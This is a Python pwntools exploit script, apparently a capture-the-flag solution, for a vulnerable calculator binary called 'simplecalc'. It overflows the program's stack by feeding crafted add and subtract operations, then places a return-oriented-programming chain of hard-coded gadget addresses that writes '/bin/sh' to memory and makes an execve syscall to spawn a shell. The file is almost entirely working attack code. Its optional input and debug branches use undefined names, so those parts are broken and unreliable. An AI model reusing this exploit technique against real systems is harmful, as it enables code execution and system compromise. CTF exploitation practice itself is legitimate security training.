#!/usr/bin/python3
import pwn
import sys
binary = "simplecalc"
pwn.context.binary = binary
pwn.context.encoding = "latin"

gadgets = {
    "pop_rdi_ret": 0x401b73,
    "pop_rcx_ret": 0x4b8f17,
    "pop_rax_ret": 0x44db34,
    "pop_rdx_ret": 0x437a85,
    "pop_rsi_ret": 0x401c87,
    "mov_rdi_ptr_rcx": 0x42b30b,
    "syscall_ret":0x4648e5,
    "bin_sh": 0x68732f6e69622f, 
    "sh":0x68732f,
    "data_section": 0x6c1060
}

def add_zero(io):
    io.sendline("2") 
    io.sendline("40")
    io.sendline("40")

def add_value(io, value):
    new_value = value - 40
    io.sendline("1")
    io.sendline(str(new_value))
    io.sendline(str(40))

def add_small(io, value):
    new_value = value + 40
    io.sendline("2")
    io.sendline(str(new_value))
    io.sendline(str(40))

if ("input" in sys.argv):
    with open("input", "wb") as io:
        io.write(payload)

if ("log" in sys.argv):
    pwn.context.log_level = "debug"

with pwn.process(binary) as io:
    io.sendline("75")
    for x in range(16):
        add_zero(io)
    add_zero(io)
    add_zero(io)
    add_value(io, gadgets["pop_rdi_ret"])
    add_zero(io)
    add_value(io, gadgets["data_section"])
    add_zero(io)
    add_value(io, gadgets["pop_rcx_ret"])
    add_zero(io)
    add_value(io, gadgets["bin_sh"])
    add_zero(io)
    add_value(io, gadgets["mov_rdi_ptr_rcx"])
    add_zero(io)
    add_value(io, gadgets["pop_rdi_ret"])
    add_zero(io)
    add_value(io, gadgets["data_section"]+4)
    add_zero(io)
    add_value(io, gadgets["pop_rcx_ret"])
    add_zero(io)
    add_value(io, gadgets["sh"])
    add_zero(io)
    add_value(io, gadgets["mov_rdi_ptr_rcx"])
    add_zero(io)
    add_value(io, gadgets["pop_rax_ret"])
    add_zero(io)
    add_small(io, 0x3b)
    add_zero(io)
    add_value(io, gadgets["pop_rdi_ret"])
    add_zero(io)
    add_value(io, gadgets["data_section"])
    add_zero(io)
    add_value(io, gadgets["pop_rsi_ret"])
    add_zero(io)
    add_zero(io)
    add_zero(io)
    add_value(io, gadgets["pop_rdx_ret"])
    add_zero(io)
    add_zero(io)
    add_zero(io)
    add_value(io, gadgets["syscall_ret"])
    io.sendline("5")

    if ("debug" in sys.argv):
        pwn.gdb.attach(io, gdbscript)

    if ("interactive" in sys.argv):
        io.interactive()

    if ("output" in sys.argv):
        pwn.info(io.readrepeat(1))
